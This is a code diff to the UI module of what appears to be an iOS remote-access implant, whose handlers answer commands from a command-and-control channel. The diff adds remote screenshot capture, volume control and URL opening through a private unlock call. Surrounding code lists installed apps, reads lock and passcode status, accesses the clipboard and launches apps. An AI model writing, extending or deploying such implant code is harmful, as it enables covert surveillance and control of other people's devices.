@@ -28,6 +28,7 @@
 #import <objc/runtime.h>
 #import <AVFoundation/AVFoundation.h>
 #import <UIKit/UIPasteboard.h>
+#import <MediaPlayer/MediaPlayer.h>
 #import <CoreFoundation/CoreFoundation.h>
 #import <UIKit/UIKit.h>
 
@@ -53,19 +54,19 @@
 #define UI_BACKLIGHT_SET \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
-                       API_CALL + 2)
+                       API_CALL + 2)    /* TODO */
 #define UI_KILL_APPS \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
-                       API_CALL + 3)
+                       API_CALL + 3)    /* TODO */
 #define UI_KILL_APP \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
-                       API_CALL + 4)
+                       API_CALL + 4)    /* TODO */
 #define UI_SAY \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
-                       API_CALL + 5)
+                       API_CALL + 5)    /* TODO */
 #define UI_OPEN_URL \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
@@ -82,21 +83,35 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
                        API_CALL + 9)
-#define UI_ALERT \
+#define UI_VOLUME_SET \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
                        API_CALL + 10)
+#define UI_VOLUME_GET \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       UI_BASE, \
+                       API_CALL + 11)
+#define UI_SCREENSHOT \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       UI_BASE, \
+                       API_CALL + 12)   /* TODO */
 
 #define TLV_TYPE_LOCKED   TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE)
 #define TLV_TYPE_PASSCODE TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE + 1)
 
-void BKSHIDServicesSetBacklightFactorWithFadeDuration(float factor, int duration);
-void BKSTerminateApplicationForReasonAndReportWithDescription(NSString *bundleID, int reasonID, bool report, NSString *description);
-
 mach_port_t SBSSpringBoardServerPort();
 void SBGetScreenLockStatus(mach_port_t port, BOOL *lockStatus, BOOL *passcodeEnabled);
 int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
-CFArrayRef SBSCopyDisplayIdentifiers(BOOL onlyActive, BOOL debuggable);
+int SBSOpenSensitiveURLAndUnlock(CFURLRef url, char flags);
+
+@interface AVSystemController : NSObject
++(instancetype)sharedAVSystemController;
+-(BOOL)setVolumeTo:(float)volume forCategory:(id)category;
+-(BOOL)getVolume:(float *)volume forCategory:(id)category;
+@end
+
+@implementation AVSystemController
+@end
 
 static tlv_pkt_t *ui_app_list(c2_t *c2)
 {
@@ -114,7 +129,8 @@ static tlv_pkt_t *ui_app_list(c2_t *c2)
     workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
     apps = [workspace performSelector:@selector(allApplications)];
 
-    for (app in apps) {
+    for (app in apps)
+    {
         NSString *bundleID = [app performSelector:@selector(applicationIdentifier)];
         tlv_pkt_add_string(result, TLV_TYPE_STRING, (char *)[bundleID UTF8String]);
     }
@@ -125,17 +141,15 @@ static tlv_pkt_t *ui_app_list(c2_t *c2)
 static tlv_pkt_t *ui_open_url(c2_t *c2)
 {
     char url[4096];
-    UIApplication *application;
-    NSURL *URL;
-    NSString *urlLink;
+    NSURL *urlLink;
+    CFURLRef finalURL;
 
     tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, url);
 
-    urlLink = [NSString stringWithUTF8String:url];
-    URL = [NSURL URLWithString:urlLink];
+    urlLink = [NSURL URLWithString:[NSString stringWithUTF8String:url]];
+    finalURL = (__bridge CFURLRef)urlLink;
 
-    [application openURL:URL options:@{} completionHandler:nil];
-
+    SBSOpenSensitiveURLAndUnlock(finalURL, 1);
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
@@ -174,10 +188,48 @@ static tlv_pkt_t *ui_sbinfo(c2_t *c2)
     return result;
 }
 
-static tlv_pkt_t *ui_alert(c2_t *c2)
+static tlv_pkt_t *ui_volume_set(c2_t *c2)
 {
+    int value;
+    float delta;
+
+    AVSystemController *controller;
+
+    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &value);
+    delta = value * 0.1;
+
+    controller = [NSClassFromString(@"AVSystemController") sharedAVSystemController];
+
+    if (![controller setVolumeTo:delta forCategory:@"Audio/Video"])
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
 
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
+}
+
+static tlv_pkt_t *ui_volume_get(c2_t *c2)
+{
+    int value;
+    float delta;
+    tlv_pkt_t *result;
+
+    AVSystemController *controller;
+
+    controller = [NSClassFromString(@"AVSystemController") sharedAVSystemController];
+
+    if (![controller getVolume:&delta forCategory:@"Audio/Video"])
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
+
+    value = delta * 10;
+    log_debug("* Volume level: %f %d\n", delta, value);
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    tlv_pkt_add_int(result, TLV_TYPE_INT, value);
+
+    return result;
 }
 
 static tlv_pkt_t *ui_clipboard_set(c2_t *c2)
@@ -228,13 +280,11 @@ static tlv_pkt_t *ui_backlight_set(c2_t *c2)
     tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &level);
     delta = level * 0.1;
 
-    BKSHIDServicesSetBacklightFactorWithFadeDuration(delta, 0);
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
 static tlv_pkt_t *ui_kill_apps(c2_t *c2)
 {
-    //BKSTerminateApplicationGroupForReasonAndReportWithDescription(1, 5, 21, NULL);
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
@@ -246,48 +296,34 @@ static tlv_pkt_t *ui_kill_app(c2_t *c2)
     tlv_pkt_add_string(c2->request, TLV_TYPE_STRING, bundle_id);
 
     bundleID = [NSString stringWithUTF8String:bundle_id];
-    BKSTerminateApplicationForReasonAndReportWithDescription(bundleID, 5, false, NULL);
-
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
 static tlv_pkt_t *ui_say(c2_t *c2)
 {
     char phrase[1024];
-
-    AVSpeechSynthesizer *synthesizer;
-    AVSpeechUtterance* utterance;
-
-    NSDictionary *languageDic;
-
     NSString *phraseSay;
-    NSString *language;
-    NSString *countryCode;
-    NSString *languageCode;
-    NSString *languageForVoice;
 
     tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, phrase);
 
-    @autoreleasepool
-    {
-        phraseSay = [NSString stringWithUTF8String:phrase];
-
-        synthesizer = [[AVSpeechSynthesizer alloc] init];
-        utterance = [AVSpeechUtterance speechUtteranceWithString:phraseSay];
-
-        utterance.rate = 0.5;
-
-        language = [[NSLocale currentLocale] localeIdentifier];
-        languageDic = [NSLocale componentsFromLocaleIdentifier:language];
-        countryCode = [languageDic objectForKey:NSLocaleCountryCode];
-        languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
-        languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];
-
-        utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
-        [synthesizer speakUtterance:utterance];
-    }
+    phraseSay = [NSString stringWithUTF8String:phrase];
 
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
+}
+
+static tlv_pkt_t *ui_screenshot(c2_t *c2)
+{
+    UIImage *image;
+    NSData *imageData;
+    tlv_pkt_t *result;
+
+    image = UIGraphicsGetImageFromCurrentImageContext();
+    imageData = UIImagePNGRepresentation(image);
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)imageData.bytes, imageData.length);
+
+    return result;
 }
 
 void register_ui_api_calls(api_calls_t **api_calls)
@@ -302,7 +338,9 @@ void register_ui_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, UI_OPEN_APP, ui_open_app);
     api_call_register(api_calls, UI_SBINFO, ui_sbinfo);
     api_call_register(api_calls, UI_APP_LIST, ui_app_list);
-    api_call_register(api_calls, UI_ALERT, ui_alert);
+    api_call_register(api_calls, UI_VOLUME_SET, ui_volume_set);
+    api_call_register(api_calls, UI_VOLUME_GET, ui_volume_get);
+    api_call_register(api_calls, UI_SCREENSHOT, ui_screenshot);
 }
 
 #endif
